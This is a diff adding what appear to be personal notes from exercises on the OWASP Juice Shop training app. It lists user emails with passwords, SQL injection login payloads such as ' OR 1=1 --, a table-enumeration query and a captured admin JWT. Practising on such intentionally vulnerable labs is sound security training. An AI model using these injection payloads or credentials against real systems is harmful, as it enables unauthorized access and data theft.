@@ -1,0 +1,24 @@
+admin@juice-sh.op admin123
+uvogin@juice-sh.op
+bender@juice-sh.op
+jim@juice-sh.op
+mc.safesearch@juice-sh.op Mr. N00dles
+bjoern.kimminich@gmail.com
+bjoern@juice-sh.op
+bjoern@owasp.org password
+
+
+
+' OR true
+
+{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMC0wNy0yMCAxMTowOToxNC42MDQgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMC0wNy0yMCAxMTowOToxNC42MDQgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNTk1MjQ5NDY4LCJleHAiOjE1OTUyNjc0Njh9.t4TeQ2dfU9BQu-WNanu7RheAjeQjrNlLmDG6C8I2gdy1fOsDIiTHxd0XLhYDj0Z00NndLcWhgCIOCS67U7cFoNQWQlVN_6kpzqRBc5rAXOVDhpHWABTHpijlzJLA-AZmduLjGqT-VgL3xp3lA725mQPRFoSdDGKiTafj2GPp4os","bid":1,"umail":"admin@juice-sh.op"}}
+
+
+SELECT name FROM sqlite_master
+WHERE type='table'
+ORDER BY name;
+
+email: "' OR 1=1 --"
+password: "' OR 1=1 --"
+
+' OR SELECT * FROM USERS --
